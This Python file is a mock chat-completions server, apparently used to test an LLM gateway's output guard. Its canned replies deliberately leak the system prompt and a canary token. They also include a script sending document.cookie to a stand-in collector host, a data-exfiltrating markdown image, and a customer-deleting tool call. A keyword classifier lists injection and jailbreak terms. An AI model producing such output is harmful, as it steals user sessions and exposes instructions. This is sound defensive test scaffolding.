"""Deterministic OpenAI-compatible mock upstream used for offline demos and tests.

This is **not** a language model. It returns canned, keyword-triggered replies
so that the gateway's *response-path* controls can be exercised: it will
happily leak its system prompt, invent a fake cloud key, emit a ``<script>``
tag or call a forbidden tool when asked - exactly the behaviours a real model
might show and the output guard must catch. Everything it produces is
synthetic.
"""

from __future__ import annotations

import json
import re
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Any

PLACEHOLDER_RE = re.compile(r"\[\[[A-Z_]+_\d+\]\]")

# Obviously synthetic secrets (the AWS one is Amazon's own documentation example key).
FAKE_AWS_KEY = "AKIAIOSFODNN7EXAMPLE"
FAKE_GITHUB_TOKEN = "ghp_" + "x" * 36
FAKE_SSN = "219-09-9999"


def _text(content: Any) -> str:
    if isinstance(content, str):
        return content
    if isinstance(content, list):
        return " ".join(str(p.get("text", "")) for p in content if isinstance(p, dict))
    return ""


def _estimate(text: str) -> int:
    return max(1, len(text) // 4)


def classify(text: str) -> dict[str, Any]:
    """Keyword classifier standing in for an LLM second opinion."""
    t = text.lower()
    hits = [kw for kw in ("ignore", "system prompt", "pwned", "jailbreak", "developer mode", "canary", "exfiltrate") if kw in t]
    score = min(1.0, 0.3 * len(hits)) if hits else 0.05
    return {"injection": score >= 0.6, "score": round(score, 2), "reason": f"keywords: {', '.join(hits) or 'none'}"}


def build_reply(body: dict[str, Any]) -> dict[str, Any]:
    """Produce a chat-completions response for ``body``."""
    messages = body.get("messages") or []
    system_text = "\n".join(_text(m.get("content")) for m in messages if m.get("role") == "system")
    user_msgs = [m for m in messages if m.get("role") in ("user", "tool")]
    last = _text(user_msgs[-1].get("content")) if user_msgs else ""
    low = last.lower()
    tool_calls: list[dict[str, Any]] | None = None

    if system_text.startswith("INJECTION_CLASSIFIER"):
        content = json.dumps(classify(last))
    elif re.search(r"(repeat|print|reveal|show|output|dump|summari[sz]e)\b.{0,40}(system prompt|your instructions|instructions above|your guidelines|canary)", low):
        # A compliant model leaking its instructions - the output guard must catch this.
        content = "Sure! Here are my instructions verbatim:\n\n" + system_text
    elif "internal reference token" in low or "reference token" in low:
        m = re.search(r"CANARY-[0-9a-f]+", system_text)
        content = f"The internal reference token is {m.group(0) if m else 'not set'}."
    elif "pwned" in low:
        content = "PWNED"
    elif "example aws" in low or "sample aws" in low or "fake aws" in low:
        content = f"Here is an example AWS access key you can use in docs: {FAKE_AWS_KEY} (AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY)."
    elif "example github token" in low:
        content = f"Example token format: {FAKE_GITHUB_TOKEN}"
    elif "example ssn" in low or "sample ssn" in low:
        content = f"A sample US SSN format is {FAKE_SSN}."
    elif "html widget" in low or "javascript snippet" in low:
        content = (
            "Here is the widget:\n\n<div onclick=\"alert('x')\">Click</div>\n"
            "<script>fetch('https://collector.example.net/?c='+document.cookie)</script>\n"
            "<a href=\"javascript:alert(1)\">link</a>"
        )
    elif "tracking image" in low or "markdown image" in low:
        content = "Done. ![status](https://collector.example.net/pixel.png?d=SESSION-DATA)"
    elif "weather" in low:
        tool_calls = [{"id": "call_1", "type": "function", "function": {"name": "get_weather", "arguments": json.dumps({"city": "Boston"})}}]
        content = ""
    elif "purge" in low or "delete all" in low:
        tool_calls = [{"id": "call_2", "type": "function", "function": {"name": "delete_records", "arguments": json.dumps({"table": "customers"})}}]
        content = ""
    elif "search the knowledge base" in low:
        tool_calls = [{"id": "call_3", "type": "function", "function": {"name": "search_kb", "arguments": json.dumps({"q": last[:40]})}}]
        content = ""
    else:
        placeholders = PLACEHOLDER_RE.findall(last)
        summary = re.sub(r"\s+", " ", last).strip()[:90]
        content = f"Mock answer to: {summary!r}."
        if placeholders:
            content += " I will keep " + ", ".join(dict.fromkeys(placeholders)) + " on file for follow-up."

    prompt_tokens = sum(_estimate(_text(m.get("content"))) for m in messages)
    completion_tokens = _estimate(content) + (10 if tool_calls else 0)
    message: dict[str, Any] = {"role": "assistant", "content": content}
    if tool_calls:
        message["tool_calls"] = tool_calls
    return {
        "id": f"chatcmpl-mock-{int(time.time() * 1000) % 10_000_000}",
        "object": "chat.completion",
        "created": int(time.time()),
        "model": body.get("model", "mock-gpt"),
        "choices": [{"index": 0, "message": message, "finish_reason": "tool_calls" if tool_calls else "stop"}],
        "usage": {
            "prompt_tokens": prompt_tokens,
            "completion_tokens": completion_tokens,
            "total_tokens": prompt_tokens + completion_tokens,
        },
    }


class MockHandler(BaseHTTPRequestHandler):
    """HTTP glue around ``build_reply``."""

    def log_message(self, fmt: str, *args: Any) -> None:  # noqa: D102 - quiet by default
        if getattr(self.server, "verbose", False):
            super().log_message(fmt, *args)

    def _send(self, status: int, payload: dict[str, Any]) -> None:
        data = json.dumps(payload).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self) -> None:  # noqa: N802
        if self.path.startswith("/healthz"):
            self._send(200, {"status": "ok", "mock": True})
        else:
            self._send(404, {"error": "not found"})

    def do_POST(self) -> None:  # noqa: N802
        if not self.path.endswith("/chat/completions"):
            self._send(404, {"error": "not found"})
            return
        length = int(self.headers.get("Content-Length", "0"))
        try:
            body = json.loads(self.rfile.read(length) or b"{}")
        except json.JSONDecodeError:
            self._send(400, {"error": {"message": "invalid JSON"}})
            return
        self._send(200, build_reply(body))


class MockServer:
    """Run the mock upstream in a background thread."""

    def __init__(self, host: str = "127.0.0.1", port: int = 0, verbose: bool = False) -> None:
        self.httpd = ThreadingHTTPServer((host, port), MockHandler)
        self.httpd.daemon_threads = True
        self.httpd.verbose = verbose  # type: ignore[attr-defined]
        self.host, self.port = self.httpd.server_address[0], self.httpd.server_address[1]
        self._thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)

    @property
    def url(self) -> str:
        """Chat-completions URL of this instance."""
        return f"http://{self.host}:{self.port}/v1/chat/completions"

    def start(self) -> "MockServer":
        """Start serving."""
        self._thread.start()
        return self

    def stop(self) -> None:
        """Stop serving."""
        self.httpd.shutdown()
        self.httpd.server_close()
